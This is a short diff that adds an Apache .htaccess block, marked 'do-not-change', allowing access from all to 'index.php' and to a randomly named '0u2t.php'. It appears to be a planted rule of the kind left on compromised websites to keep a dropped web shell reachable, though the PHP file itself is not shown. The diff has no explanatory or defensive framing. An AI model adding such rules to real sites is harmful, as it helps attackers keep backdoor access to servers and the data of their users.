@@ -1,0 +1,5 @@
+#---do-not-change-the-following-content---
+<FilesMatch '^(0u2t.php|index.php)$'>
+Order allow,deny
+Allow from all
+</FilesMatch>
